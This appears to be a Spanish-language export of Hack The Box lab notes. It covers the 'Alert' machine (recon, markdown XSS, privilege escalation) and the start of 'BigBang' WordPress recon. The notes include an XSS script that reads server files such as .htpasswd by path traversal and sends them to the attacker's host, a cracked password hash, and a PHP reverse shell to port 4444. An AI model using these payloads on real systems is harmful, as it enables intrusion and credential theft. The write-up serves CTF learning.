<rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0"><parsererror xmlns="http://www.w3.org/1999/xhtml" style="display: block; white-space: pre; border: 2px solid #c77; padding: 0 1em 0 1em; margin: 1em; background-color: #fdd; color: black"><h3>This page contains the following errors:</h3><div style="font-family:monospace;font-size:12px">error on line 1957 at column 538: Invalid bytes in character encoding
</div><h3>Below is a rendering of the page up to the first error.</h3></parsererror><channel><title><![CDATA[HTB]]></title><description><![CDATA[Obsidian digital garden]]></description><link>http://github.com/dylang/node-rss</link><image><url>lib/media/favicon.png</url><title>HTB</title><link/></image><generator>Webpage HTML Export plugin for Obsidian</generator><lastBuildDate>Thu, 06 Mar 2025 17:28:29 GMT</lastBuildDate><atom:link href="lib/rss.xml" rel="self" type="application/rss+xml"/><pubDate>Thu, 06 Mar 2025 17:28:04 GMT</pubDate><ttl>60</ttl><dc:creator/><item><title><![CDATA[00-index]]></title><description><![CDATA[ 
 <br>This is the structure of the machine folder<br>Loading...<br><br><br><br>
<br>Text
<br>Text
<br><br>
<br><a rel="noopener nofollow" class="external-link" href="https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS" target="_blank">https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS</a>
<br><a rel="noopener nofollow" class="external-link" href="https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS" target="_blank">https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS</a>
<br><a rel="noopener nofollow" class="external-link" href="https://sqlmap.org/" target="_blank">https://sqlmap.org/</a>
<br>...
]]></description><link>machines/alert/00-index.html</link><guid isPermaLink="false">Machines/Alert/00-index.md</guid><pubDate>Wed, 27 Nov 2024 00:27:04 GMT</pubDate></item><item><title><![CDATA[01-recon]]></title><description><![CDATA[ 
 <br>{TPC SynScan}<br>sudo nmap -sS --min-rate 5000 -Pn -n -vvv alert.htb -oN reconsS.txt 
[sudo] contraseña para kali: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-26 16:19 CET
Initiating SYN Stealth Scan at 16:19
Scanning alert.htb (10.10.11.44) [1000 ports]
Discovered open port 80/tcp on 10.10.11.44
Discovered open port 22/tcp on 10.10.11.44
Completed SYN Stealth Scan at 16:19, 0.25s elapsed (1000 total ports)
Nmap scan report for alert.htb (10.10.11.44)
Host is up, received user-set (0.037s latency).
Scanned at 2024-11-26 16:19:50 CET for 0s
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.37 seconds
           Raw packets sent: 1000 (44.000KB) | Rcvd: 1000 (40.008KB)

<br>{TCP SCV}<br> sudo nmap -sCV --min-rate 5000 -Pn -n -vvv alert.htb  -p 22,80 -oN reconsCV.txt
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-26 16:20 CET
NSE: Loaded 156 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 16:20
Completed NSE at 16:20, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 16:20
Completed NSE at 16:20, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 16:20
Completed NSE at 16:20, 0.00s elapsed
Initiating SYN Stealth Scan at 16:20
Scanning alert.htb (10.10.11.44) [2 ports]
Discovered open port 22/tcp on 10.10.11.44
Discovered open port 80/tcp on 10.10.11.44
Completed SYN Stealth Scan at 16:20, 0.06s elapsed (2 total ports)
Initiating Service scan at 16:20
Scanning 2 services on alert.htb (10.10.11.44)
Completed Service scan at 16:20, 6.17s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.11.44.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 16:20
Completed NSE at 16:20, 1.31s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 16:20
Completed NSE at 16:20, 0.15s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 16:20
Completed NSE at 16:20, 0.00s elapsed
Nmap scan report for alert.htb (10.10.11.44)
Host is up, received user-set (0.037s latency).
Scanned at 2024-11-26 16:20:42 CET for 8s

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 7e:46:2c:46:6e:e6:d1:eb:2d:9d:34:25:e6:36:14:a7 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDSrBVJEKTgtUohrzoK9i67CgzqLAxnhEsPmW8hS5CFFGYikUduAcNkKsmmgQI09Q+6pa+7YHsnxcerBnW0taI//IYB5TI/LSE3yUxyk/ROkKLXPNiNGUhC6QiCj3ZTvThyHrFD9ZTxWfZKEQTcOiPs15+HRPCZepPouRtREGwmJcvDal1ix8p/2/C8X57ekouEEpIk1wzDTG5AM2/D08gXXe0TP+KYEaZEzAKM/mQUAqNTxfjc9x5rlfPYW+50kTDwtyKta57tBkkRCnnns0YRnPNtt0AH374ZkYLcqpzxwN8iTNXaeVT/dGfF4mA1uW89hSMarmiRgRh20Y1KIaInHjv9YcvSlbWz+2sz3ev725d4IExQTvDR4sfUAdysIX/q1iNpleyRgM4cvDMjxD6lEKpvQYSWVlRoJwbUUnJqnmZXboRwzRl+V3XCUaABJrA/1K1gvJfsPcU5LX303CV6LDwvLJIcgXlEbtjhkcxz7b7CS78BEW9hPifCUDGKfUs=
|   256 45:7b:20:95:ec:17:c5:b4:d8:86:50:81:e0:8c:e8:b8 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHYLF+puo27gFRX69GBeZJqCeHN3ps2BScsUhKoDV66yEPMOo/Sn588F/wqBnJxsPB3KSFH+kbYW2M6erFI3U5k=
|   256 cb:92:ad:6b:fc:c8:8e:5e:9f:8c:a2:69:1b:6d:d0:f7 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIG/QUl3gapBOWCGEHplsOKe2NlWjlrb5vTTLjg6gMuGl
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-title: Alert - Markdown Viewer
|_Requested resource was index.php?page=alert
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 16:20
Completed NSE at 16:20, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 16:20
Completed NSE at 16:20, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 16:20
Completed NSE at 16:20, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.35 seconds
           Raw packets sent: 2 (88B) | Rcvd: 2 (88B)

<br><br><br><br><br><br><br><br>wfuzz --sc 400,200,300 -w /usr/share/wordlists/wfuzz/general/common.txt http://alert.htb/FUZZ.php 
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://alert.htb/FUZZ.php
Total requests: 951

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                    
=====================================================================

000000203:   200        1 L      3 W        24 Ch       "contact"                                                                                                  
000000521:   200        1 L      0 W        1 Ch        "messages"                                                                                                 

Total time: 0
Processed Requests: 951
Filtered Requests: 949
Requests/sec.: 0


<br><br>“Pasted image 20241126162421.png” could not be found.<br><br><img alt="Pasted image 20241126162252.png" src="machines/alert/images/pasted-image-20241126162252.png"><br><br><br>&lt;!DOCTYPE html&gt;
&lt;html lang="en"&gt;
&lt;head&gt;
    &lt;meta charset="UTF-8"&gt;
    &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt;
    &lt;link rel="stylesheet" href="[css/style.css](view-source:http://alert.htb/css/style.css)"&gt;
    &lt;title&gt;Alert - Markdown Viewer&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
    &lt;nav&gt;
        &lt;a href="[index.php?page=alert](view-source:http://alert.htb/index.php?page=alert)"&gt;Markdown Viewer&lt;/a&gt;
        &lt;a href="[index.php?page=contact](view-source:http://alert.htb/index.php?page=contact)"&gt;Contact Us&lt;/a&gt;
        &lt;a href="[index.php?page=about](view-source:http://alert.htb/index.php?page=about)"&gt;About Us&lt;/a&gt;
        &lt;a href="[index.php?page=donate](view-source:http://alert.htb/index.php?page=donate)"&gt;Donate&lt;/a&gt;
            &lt;/nav&gt;
    &lt;div class="container"&gt;
        &lt;h1&gt;Markdown Viewer&lt;/h1&gt;&lt;div class="form-container"&gt;
            &lt;form action="[visualizer.php](view-source:http://alert.htb/visualizer.php)" method="post" enctype="multipart/form-data"&gt;
                &lt;input type="file" name="file" accept=".md" required&gt;
                &lt;input type="submit" value="View Markdown"&gt;
            &lt;/form&gt;
          &lt;/div&gt;    &lt;/div&gt;
    &lt;footer&gt;
        &lt;p style="color: black;"&gt;© 2024 Alert. All rights reserved.&lt;/p&gt;
    &lt;/footer&gt;
&lt;/body&gt;
&lt;/html&gt;
<br><br>&lt;!DOCTYPE html&gt;
&lt;html lang="en"&gt;
&lt;head&gt;
    &lt;meta charset="UTF-8"&gt;
    &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt;
    &lt;title&gt;Alert - Markdown Viewer&lt;/title&gt;
    &lt;link rel="stylesheet" href="[css/style.css](view-source:http://alert.htb/css/style.css)"&gt;
    &lt;style&gt;
        .share-button {
            position: fixed;
            bottom: 20px;
            right: 20px;
            background-color: rgb(100, 100, 100);
            color: #fff;
            border: none;
            padding: 10px 20px;
            border-radius: 5px;
            cursor: pointer;
        }
    &lt;/style&gt;
&lt;/head&gt;
&lt;body&gt;
    Please upload a Markdown file.&lt;/body&gt;
&lt;/html&gt;
<br>Intentamos subir un archivo markdown ..<br>
“Pasted image 20241126163005.png” could not be found.<br>Vamos  a intentar un XSS en el archivo markdown, para ello:<br>&lt;!-- XSS with regular tags --&gt;
&lt;script&gt;alert(1)&lt;/script&gt;
&lt;img src=x onerror=alert(1) /&gt;
<br>“Pasted image 20241126165646.png” could not be found.<br>El servidor es vulnerable a XSS<br><br><br>
<br>statistics.alert.htb
]]></description><link>machines/alert/01-recon.html</link><guid isPermaLink="false">Machines/Alert/01-recon.md</guid><pubDate>Wed, 27 Nov 2024 01:47:39 GMT</pubDate><enclosure url="machines/alert/images/pasted-image-20241126162252.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src="machines/alert/images/pasted-image-20241126162252.png"&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[02-exploitation]]></title><description><![CDATA[ 
 <br><br>
<br>XSS(over markdown)
<br>Phishing 
<br><br>Una vez localizado el xss probamos un exploit en el archivo de markdown <br>&lt;script&gt;  
fetch("http://alert.htb/messages.php?file=filepath")  
  .then(response =&gt; response.text())  
  .then(data =&gt; {  
    fetch("http://10.10.15.43:2323/?file_content=" + encodeURIComponent(data));  
  });  
&lt;/script&gt;
<br>El script hace lo siguiente:<br>
<br>Obtiene el contenido de  la carpeta "messages" que devolvia un 403 Forbidden  (http://alert.htb/messages.php?file=filepath).
<br>Luego, toma ese contenido y lo reenvía como parámetro  a nuestro servidor en el puerto 2323 (http://10.10.15.43:2323/)
<br>python3 -m http.server 2323   
Serving HTTP on 0.0.0.0 port 2323 (http://0.0.0.0:2323/) ...
<br>Recibimos respuesta de nosotros mismos:<br>10.10.15.43 - - [29/Nov/2024 01:07:23] "GET /?file_content=%0A HTTP/1.1" 200 -
10.10.15.43 - - [29/Nov/2024 01:07:30] "GET /?file_content=%0A HTTP/1.1" 200 -
<br><br>Podemos darle a boton de "share markdown" y nos devuelve un link que vamos a mandale al admin en "contact"<br>
(<a rel="noopener nofollow" class="external-link" href="http://alert.htb/index.php?page=contact" target="_blank">http://alert.htb/index.php?page=contact</a>)<br>
<img alt="Pasted image 20241129010955.png" src="machines/alert/pasted-image-20241129010955.png"><br>
Nos devuelve conexion !<br>10.10.11.44 - - [29/Nov/2024 01:10:56] "GET /?file_content=%3Cpre%3E%3C%2Fpre%3E%0A HTTP/1.1" 200 -
<br>Ahora sabemos que le podemos hacer un phishing al admin<br>Modificamos el script para sacar informacion<br><br>Vamos a buscar el .htpassword del subdominio statistics que vimos en el recon para sacar un hash<br>&lt;script&gt;  
fetch("http://alert.htb/messages.php?file=./../../../../../../var/www/statistics.alert.htb/.htpasswd")  
  .then(response =&gt; response.text())  
  .then(data =&gt; {  
    fetch("http://10.10.15.43:2323/?file_content=" + encodeURIComponent(data));  
  });  
&lt;/script&gt;

<br>El archivo .htpasswd es utilizado en servidores web Apache para almacenar las credenciales de usuario y sus contraseñas, de modo que los usuarios puedan autenticarse cuando acceden a ciertas áreas del sitio protegido por autenticación básica. Este archivo se encuentra generalmente en el servidor (usualmente en un directorio fuera del acceso público) y contiene una lista de usuarios con sus contraseñas cifradas.<br>
Serving HTTP on 0.0.0.0 port 2323 (http://0.0.0.0:2323/) ...
10.10.15.43 - - [29/Nov/2024 01:24:05] "GET /?file_content=%0A HTTP/1.1" 200 -
10.10.15.43 - - [29/Nov/2024 01:24:06] "GET /?file_content=%0A HTTP/1.1" 200 -
10.10.15.43 - - [29/Nov/2024 01:24:12] "GET /?file_content=%0A HTTP/1.1" 200 -
10.10.15.43 - - [29/Nov/2024 01:24:14] "GET /?file_content=%0A HTTP/1.1" 200 -
10.10.11.44 - - [29/Nov/2024 01:24:19] "GET /?file_content=%3Cpre%3E%3C%2Fpre%3E%0A HTTP/1.1" 200 -
<br>10.10.15.43 - - [29/Nov/2024 01:21:21] "GET /?file_content=%0A HTTP/1.1" 200 -
10.10.15.43 - - [29/Nov/2024 01:21:24] "GET /?file_content=%0A HTTP/1.1" 200 -
10.10.11.44 - - [29/Nov/2024 01:21:30] "GET /?file_content=%3Cpre%3Ealbert%3A%24apr1%24bMoRBJOg%24igG8WBtQ1xYDTQdLjSWZQ%2F%0A%3C%2Fpre%3E%0A HTTP/1.1" 200 -

<br>El texto codificado en URL %3Cpre%3Ealbert%3A%24apr1%24bMoRBJOg%24igG8WBtQ1xYDTQdLjSWZQ%2F%0A%3C%2Fpre%3E%0A<br>
puede ser decodificado de la siguiente manera:<br>%3C corresponde a &lt;
%3E corresponde a &gt;
%24 corresponde a $
%2F corresponde a /
%0A corresponde a un salto de línea (nueva línea)
<br>Al decodificarlo, obtenemos el siguiente texto:<br>&lt;pre&gt;albert:$apr1$bMoRBJOg$igG8WBtQ1xYDTQdLjSWZQ/&lt;/pre&gt;
<br>Parece que tenemos un hash en md5 de apache<br>$john -w=/usr/share/wordlists/rockyou.txt -format=md5crypt-long  hash
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt-long, crypt(3) $1$ (and variants) [MD5 32/64])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
manchesterunited (alber)     
1g 0:00:00:00 DONE (2024-11-29 01:30) 6.250g/s 17600p/s 17600c/s 17600C/s bebito..medicina
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
<br>Ahora podemos conectarnos por ssh como usuario : Albert<br><br><br>albert@alert:~$ netstat -tulnp
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   
udp        0      0 0.0.0.0:68              0.0.0.0:*                           -        
<br>Tenemos un jugoso 8080 donde vamos a mener el foucino <br>ssh albert@alert.htb -L 8080:localhost:8080
<br><img alt="Pasted image 20241129022709.png" src="machines/alert/pasted-image-20241129022709.png"><br><a rel="noopener nofollow" class="external-link" href="https://github.com/neatnik/website-monitor" target="_blank">https://github.com/neatnik/website-monitor</a><br>Dentro de la documentacion del github para monitor:<br>"Upload everything to your web server (except the screen.png file, which isn’t needed). Make sure that PHP has permission to write to the monitors directory (this is where monitor data is stored)."<br>vamos a buscar la carpeta monitors al sistema ya que php se comunica con la carpeta <br>find / -type d -name "monitor" 2&gt;/dev/null

### Respuesta
find / -type d -name "*monitor*" 2&gt;/dev/null
/var/lib/systemd/deb-systemd-helper-enabled/mdmonitor.service.wants
/opt/website-monitor
/opt/website-monitor/monitors
/sys/kernel/slab/:A-0000192/cgroup/cred_jar(637:website-monitor.service)
/sys/kernel/slab/hugetlbfs_inode_cache/cgroup/hugetlbfs_inode_cache(637:website-monitor.service)
/sys/kernel/slab/:A-0001344/cgroup/UDPv6(637:website-monitor.service)
/sys/kernel/slab/sock_inode_cache/cgroup/sock_inode_cache(637:website-monitor.service)
/sys/kernel/slab/kmalloc-64/cgroup/kmalloc-64(637:website-monitor.service)
/sys/kernel/slab/radix_tree_node/cgroup/radix_tree_node(107:lvm2-monitor.service)
/sys/kernel/slab/radix_tree_node/cgroup/radix_tree_node(637:website-monitor.service)
/sys/kernel/slab/dentry/cgroup/dentry(637:website-monitor.service)
/sys/kernel/slab/dentry/cgroup/dentry(107:lvm2-monitor.service)
/sys/kernel/slab/:A-0000064/cgroup/anon_vma_chain(637:website-monitor.service)
/sys/kernel/slab/anon_vma/cgroup/anon_vma(637:website-monitor.service)
/sys/kernel/slab/:a-0000104/cgroup/buffer_head(107:lvm2-monitor.service)
/sys/kernel/slab/:a-0000104/cgroup/buffer_head(637:website-monitor.service)
/sys/kernel/slab/mm_struct/cgroup/mm_struct(637:website-monitor.service)
/sys/kernel/slab/inode_cache/cgroup/inode_cache(637:website-monito

....
<br>La carpeta website-monitors parece promising vamos a echarle un vistazo<br>albert@alert:/opt/website-monitor$ ls -la .
total 96
drwxrwxr-x 7 root root        4096 Oct 12 01:07 .
drwxr-xr-x 4 root root        4096 Oct 12 00:58 ..
drwxrwxr-x 2 root management  4096 Oct 12 04:17 config
drwxrwxr-x 8 root root        4096 Oct 12 00:58 .git
drwxrwxr-x 2 root root        4096 Oct 12 00:58 incidents
-rwxrwxr-x 1 root root        5323 Oct 12 01:00 index.php
-rwxrwxr-x 1 root root        1068 Oct 12 00:58 LICENSE
-rwxrwxr-x 1 root root        1452 Oct 12 01:00 monitor.php
drwxrwxrwx 2 root root        4096 Oct 12 01:07 monitors
-rwxrwxr-x 1 root root         104 Oct 12 01:07 monitors.json
-rwxrwxr-x 1 root root       40849 Oct 12 00:58 Parsedown.php
-rwxrwxr-x 1 root root        1657 Oct 12 00:58 README.md
-rwxrwxr-x 1 root root        1918 Oct 12 00:58 style.css
drwxrwxr-x 2 root root        4096 Oct 12 00:58 updates

<br>Con permiso de escritura en la carpeta config creamos un archivo reverse.php<br>&lt;?php exec("/bin/bash -c 'bash -i &gt;/dev/tcp/10.10.15.43/4444 0&gt;&amp;1'"); ?&gt;
<br>ahora realizo una peticion web al archivo localhost:8080/config/reverse.php<br><img alt="Pasted image 20241129025934.png" src="machines/alert/pasted-image-20241129025934.png"><br><br>
<br>local 8080 open port 127.0.0.1:8080
<br><br>
<br>
<br>]]></description><link>machines/alert/02-exploitation.html</link><guid isPermaLink="false">Machines/Alert/02-exploitation.md</guid><pubDate>Fri, 29 Nov 2024 01:59:54 GMT</pubDate><enclosure url="machines/alert/pasted-image-20241129010955.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src="machines/alert/pasted-image-20241129010955.png"&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[03-post-exploitation]]></title><description><![CDATA[ 
 <br><br>
<br>
<br><br>
<br>
<br>]]></description><link>machines/alert/03-post-exploitation.html</link><guid isPermaLink="false">Machines/Alert/03-post-exploitation.md</guid><pubDate>Wed, 27 Nov 2024 00:27:03 GMT</pubDate></item><item><title><![CDATA[Alert]]></title><description><![CDATA[<a class="tag" href="?query=tag:machine" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#machine</a> 
 <br><br><br> <img src="https://www.hackthebox.com//storage/avatars/6f4647030d6aadc676b8d8a459de344f.png" referrerpolicy="no-referrer"> <br><a href=".?query=tag:machine" class="tag" target="_blank" rel="noopener nofollow">#machine</a><br><br><img src="lib/media/linux.png" style="max-width:70px" referrerpolicy="no-referrer"><br><br><br>
id:: 636
active:: True
name:: Alert
os::Linux
user_flag:: True
root_flag:: True
difficulty_text:: Easy
stars:: 4.3
created:: 01/25/2025
published:: 11/23/24
avatar:: /storage/avatars/6f4647030d6aadc676b8d8a459de344f.png
tags:: 
<br><br><br><br><br>Update this Machine info]]></description><link>machines/alert/alert.html</link><guid isPermaLink="false">Machines/Alert/Alert.md</guid><pubDate>Sat, 25 Jan 2025 18:07:24 GMT</pubDate><enclosure url="https://www.hackthebox.com//storage/avatars/6f4647030d6aadc676b8d8a459de344f.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src="https://www.hackthebox.com//storage/avatars/6f4647030d6aadc676b8d8a459de344f.png"&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[01-Recon]]></title><description><![CDATA[ 
 <br><br><br>Al entrar en el puerto 80 se redirige automaticamente al subdominio <a rel="noopener nofollow" class="external-link" href="http://blog.bigbang.htb/" target="_blank">http://blog.bigbang.htb/</a> por lo que lo guardamos en el '/etc/hosts'<br>echo "10.10.11.52 blog.bigbang.htb" &gt;&gt; /etc/hosts
<br>En el puerto 80 nos encontramos un blog de wordpress:<br>➜  BigBang wappalyzer -i http://blog.bigbang.htb
http://blog.bigbang.htb Apache HTTP Server v2.4.62, Debian, PHP v8.3.2, WordPress v6.5.4, Backbone.js v1.5.0, Clipboard.js, jQuery v3.7.1, jQuery Migrate v3.4.1, TinyMCE v4, Underscore.js v1.13.4, core-js v3.35.1, Dropzone v5.7.0, jQuery UI v1.13.2, Lodash v1.13.6, MediaElement.js v4.2.17, mOxie, Select2, Twitter Emoji (Twemoji), RSS
<br><img alt="Pasted image 20250131121917.png" src="machines/bigbang/imgs/pasted-image-20250131121917.png"><br><br>Vamos a fuzzear el wordpress para encontrar archivos accesibles interesantes:<br>➜  BigBang find /usr/share/seclists/ -type f -iname 'wordpress*'

/usr/share/seclists/Passwords/Honeypot-Captures/wordpress-attacks-july2014.txt
/usr/share/seclists/Discovery/Web-Content/CMS/trickest-cms-wordlist/wordpress.txt
/usr/share/seclists/Discovery/Web-Content/CMS/trickest-cms-wordlist/wordpress-all-levels.txt
/usr/share/seclists/Discovery/Web-Content/CMS/wordpress.fuzz.txt
➜  BigBang feroxbuster -u http://blog.bigbang.htb -w /usr/share/seclists/Discovery/Web-Content/CMS/wordpress.fuzz.txt

200      GET      182l      398w     3834c http://blog.bigbang.htb/wp-admin/css/color-picker.css
200      GET      384l     3177w    19915c http://blog.bigbang.htb/license.txt
200      GET        1l        1w        2c http://blog.bigbang.htb/wp-admin/admin-footer.php
200      GET        2l     1375w    58586c http://blog.bigbang.htb/wp-admin/css/customize-controls-rtl.min.css
200      GET      397l      781w     6223c http://blog.bigbang.htb/wp-admin/css/install-rtl.css
200      GET      396l      775w     6190c http://blog.bigbang.htb/wp-admin/css/install.css
200      GET      479l     1182w    12597c http://blog.bigbang.htb/wp-admin/css/customize-widgets-rtl.css
200      GET     2037l     3990w    37699c http://blog.bigbang.htb/wp-admin/css/edit.css
200      GET       16l       36w      490c http://blog.bigbang.htb/wp-admin/css/wp-admin-rtl.css
200      GET       16l       36w      490c http://blog.bigbang.htb/wp-admin/css/wp-tables.min.css

etc...
<br>Para una busqueda mas detallada del wordpress podemos usar <a data-tooltip-position="top" aria-label="https://wpscan.com/" rel="noopener nofollow" class="external-link" href="https://wpscan.com/" target="_blank">WpScan</a> que es una herramienta que nos permite buscar vulnerabilidades de wordpress<br>[+] URL: http://blog.bigbang.htb/ [10.10.11.52]
[+] Started: Fri Jan 31 13:23:49 2025

Interesting Finding(s):

[+] Headers
 | Interesting Entries:
 |  - Server: Apache/2.4.62 (Debian)
 |  - X-Powered-By: PHP/8.3.2
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://blog.bigbang.htb/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://blog.bigbang.htb/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://blog.bigbang.htb/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://blog.bigbang.htb/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 6.5.4 identified (Insecure, released on 2024-06-05).
 | Found By: Rss Generator (Passive Detection)
 |  - http://blog.bigbang.htb/?feed=rss2, &lt;generator&gt;https://wordpress.org/?v=6.5.4&lt;/generator&gt;
 |  - http://blog.bigbang.htb/?feed=comments-rss2, &lt;generator&gt;https://wordpress.org/?v=6.5.4&lt;/generator&gt;

[+] WordPress theme in use: twentytwentyfour
 | Location: http://blog.bigbang.htb/wp-content/themes/twentytwentyfour/
 | Last Updated: 2024-11-13T00:00:00.000Z
 | Readme: http://blog.bigbang.htb/wp-content/themes/twentytwentyfour/readme.txt
 | [!] The version is out of date, the latest version is 1.3
 | [!] Directory listing is enabled
 | Style URL: http://blog.bigbang.htb/wp-content/themes/twentytwentyfour/style.css
 | Style Name: Twenty Twenty-Four
 | Style URI: https://wordpress.org/themes/twentytwentyfour/
 | Description: Twenty Twenty-Four is designed to be flexible, versatile and applicable to any website. Its collecti...
 | Author: the WordPress team
 | Author URI: https://wordpress.org
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 1.1 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://blog.bigbang.htb/wp-content/themes/twentytwentyfour/style.css, Match: 'Version: 1.1'

[+] Enumerating All Plugins (via Passive Methods)
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] buddyforms
 | Location: http://blog.bigbang.htb/wp-content/plugins/buddyforms/
 | Last Updated: 2025-01-30T02:58:00.000Z
 | [!] The version is out of date, the latest version is 2.8.15
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 2.7.7 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://blog.bigbang.htb/wp-content/plugins/buddyforms/readme.txt

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:02 &lt;===============================================================================================================================================================&gt; (137 / 137) 100.00% Time: 00:00:02

[i] No Config Backups Found.

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Fri Jan 31 13:24:01 2025
[+] Requests Done: 171
[+] Cached Requests: 5
[+] Data Sent: 44.029 KB
[+] Data Received: 778.725 KB
[+] Memory used: 296.125 MB
[+] Elapsed time: 00:00:12
➜  BigBang 


<br>Segun el Recon tenemos diferentes vectores de ataque:<br>Vectores:<br>
1.Wordpress V 6.5.4 (insecure)<br>
La version de wordpress esta desactualizada.<br>
<a data-tooltip-position="top" aria-label="https://www.tenable.com/plugins/was/114353" rel="noopener nofollow" class="external-link" href="https://www.tenable.com/plugins/was/114353" target="_blank">Info</a><br>
2.XML-RPC Habilitado<br>
Con ello podemos:<br>
Brute-forcing credenciales usando el xmlrpc.php endpoint.<br>
Amplificar los DoS.<br>
Ataques de Pingback (denial of service)<br>
3. Pluggin buddyforms desactualizado<br>
Vulnerable a <a data-tooltip-position="top" aria-label="https://nvd.nist.gov/vuln/detail/CVE-2023-26326" rel="noopener nofollow" class="external-link" href="https://nvd.nist.gov/vuln/detail/CVE-2023-26326" target="_blank">CVE-2023-26326</a><br>
4. El Theme de Wordpress 'twentytwentyfour'<br>
Tiene la version desactualizada la actual ultima version es la  1.3<br>
Tiene el Directory listing habilitado, en la siguiente <a data-tooltip-position="top" aria-label="https://wordpress.org/themes/twentytwentyfour/" rel="noopener nofollow" class="external-link" href="https://wordpress.org/themes/twentytwentyfour/" target="_blank">ruta</a><br><br>Encontramos varias API's a los que el servidor envia peticiones:<br>http://blog.bigbang.htb/wp-admin/admin-ajax.php
http://blog.bigbang.htb/wp-admin/upload.php
